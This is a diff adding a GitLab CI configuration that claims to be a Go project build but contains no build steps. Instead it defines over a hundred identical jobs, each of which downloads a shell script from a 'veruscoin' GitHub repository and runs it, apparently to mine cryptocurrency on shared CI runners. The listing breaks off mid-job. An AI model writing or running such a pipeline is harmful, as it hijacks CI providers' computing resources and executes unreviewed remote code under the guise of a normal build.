@@ -1,0 +1,1259 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_b:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_c:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_d:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_e:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_f:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_g:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_h:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_i:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_j:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_k:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_l:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_m:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_n:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_o:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_p:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_q:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_r:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_s:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_t:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_u:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_v:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_w:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_x:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_y:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_z:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ab:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ac:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ad:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ae:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_af:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ag:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ah:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ai:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aj:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ak:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_al:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_am:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_an:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ao:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_av:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aw:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ax:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_ay:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_az:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aaa:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aab:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aac:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aad:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_aae:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_1:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_2:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_3:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_4:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_5:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_6:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_7:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_8:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_9:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_10:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_11:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_12:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_13:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_14:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_15:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_16:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_17:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_18:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_19:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_20:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_21:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_22:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_23:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_24:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_25:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+build_26:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_27:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_28:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_29:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_30:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_31:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_32:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_33:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_34:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_35:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_36:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_37:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_38:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_39:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_40:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_41:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_42:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_43:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_44:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_45:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_46:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_47:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_48:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_49:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_50:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_51:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_52:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_53:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_54:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_55:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_56:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_57:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_58:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_59:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_60:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_61:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_62:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_63:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_64:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_65:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_66:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_67:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_68:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_69:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_70:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_71:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_72:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_73:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_74:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_75:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+build_76:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_77:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_78:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_79:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_80:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_81:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_82:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_83:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_84:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_85:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_86:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_87:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_88:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_89:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_90:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_91:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_92:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_93:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_94:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_95:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_96:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_97:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_98:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_99:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_100:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_101:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_102:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_103:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_104:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_105:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_106:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_107:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_108:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_109:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_110:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_111:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_112:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_113:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_114:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_115:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_116:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_117:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_118:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_119:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_120:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_121:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_122:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_123:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_124:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_125:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+build_126:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_127:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_128:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_129:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_130:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_131:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_132:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_133:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_134:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_135:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_136:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_137:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_138:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_139:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_140:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_141:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_142:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_143:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_144:
+  stage: build
+  script:
